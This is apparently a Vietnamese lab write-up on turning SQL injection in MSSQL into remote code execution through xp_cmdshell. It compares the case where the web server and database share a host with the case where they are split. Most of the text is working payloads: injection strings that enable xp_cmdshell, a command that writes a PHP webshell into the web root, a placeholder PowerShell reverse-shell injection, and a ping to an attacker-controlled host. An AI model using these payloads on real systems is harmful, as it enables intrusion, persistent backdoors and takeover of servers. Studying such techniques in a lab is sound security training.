# Task 4: RCE MSSQL - Cùng Server vs Khác Server


## Bật xp_cmdshell
Thường phải bật `show advanced options` trước, rồi mới bật `xp_cmdshell`:
```sql
1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

Sau đó kiểm tra bằng lệnh ngắn:
```sql
1'; EXEC xp_cmdshell 'whoami'; --
```

Nếu trả ra user của Windows/MSSQL, nghĩa là command đã chạy được.

## Case 1: Web Và DB Cùng Server
Khi web và DB cùng máy, lệnh từ `xp_cmdshell` có thể nhìn thấy cả file system của web server. Đây là trường hợp đơn nhất vì có thể ghi webshell trực tiếp vào thư mục web.

Ví dụ:
```sql
1'; EXEC xp_cmdshell 'echo "<?php system($_GET[\"cmd\"]); ?>" > C:\inetpub\wwwroot\shell.php'; --
```

Nếu thư mục web đúng là `C:\inetpub\wwwroot\` hoặc một document root tương tự, ta sẽ truy cập được:
```text
http://localhost:8051/shell.php?cmd=whoami
```

### Cách nhận biết cùng server
1. So sánh hostname.
```sql
SELECT @@SERVERNAME;
```
Rồi chạy:
```sql
EXEC xp_cmdshell 'hostname';
```
Nếu tên host trùng nhau hoặc rất giống nhau, khả năng cao là cùng máy.

2. Kiểm tra đường dẫn web phổ biến.
```sql
EXEC xp_cmdshell 'DIR C:\inetpub\wwwroot\';
EXEC xp_cmdshell 'DIR C:\xampp\htdocs\';
```
Nếu thấy file web ở đây, DB và web thường cùng host.

3. Dùng ping vào chính web/app.
```sql
EXEC xp_cmdshell 'ping localhost';
```
Nếu web đang chạy ngay trên máy DB, `localhost` sẽ trả về đúng machine đó.

## Case 2: Web Và DB Khác Server
Khi web và DB tách nhau, `xp_cmdshell` vẫn chạy được nhưng nó chỉ chạy trên máy DB. Vì vậy, việc ghi webshell vào thư mục web thường không có tác dụng, do thư mục đó không nằm trên máy DB.

Trong case này, cách khai thác hợp lý hơn là reverse shell, thực thi lệnh chỉ để lấy thông tin máy DB.

```sql
1'; EXEC master..xp_cmdshell 'powershell -c "...reverse-shell-code..."'; --
```

### Cách nhận biết khác server
1. Ping ra ngoài một webhook hoặc host bạn kiểm soát.
```sql
EXEC xp_cmdshell 'ping attacker-webhook.com';
```
Nếu log source IP ở webhook khác với IP của web server, hai máy đang tách nhau.

2. Kiểm tra hostname của máy DB và web không trùng.
```sql
SELECT @@SERVERNAME;
EXEC xp_cmdshell 'hostname';
```
Nếu khác nhau rõ ràng, rất có thể là hai host riêng.

3. Tìm document root trên máy DB nhưng không thấy.
```sql
EXEC xp_cmdshell 'DIR C:\inetpub\wwwroot\';
EXEC xp_cmdshell 'DIR C:\xampp\htdocs\';
```
Nếu không có thư mục web hoặc không có file web quen thuộc, DB có thể đang ở máy riêng.

4. Thử write file nhưng không truy cập được từ web.
Đây là dấu hiệu rất thực tế: command chạy xong trên DB, nhưng file không hiện trên web vì web nằm ở máy khác.
